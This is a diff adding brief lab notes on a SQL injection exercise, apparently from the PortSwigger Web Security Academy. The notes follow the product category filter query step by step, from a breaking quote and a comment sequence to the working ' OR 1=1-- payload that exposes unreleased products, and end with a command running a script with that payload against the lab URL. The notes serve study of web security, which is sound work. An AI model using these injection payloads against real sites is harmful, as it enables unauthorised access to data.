@@ -1,0 +1,15 @@
+SQL injection vulnerability - product category filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+END GOAL: display details of all products in any category, both released and unreleased.
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1 //internal server error
+
+SELECT * FROM products WHERE category = ''--' AND released = 1 // category = '-- does not exist
+
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+python sqli_lab1.py https://ac101f081f3ac547807c78f0004a0027.web-security-academy.net/"' OR 1=1--"
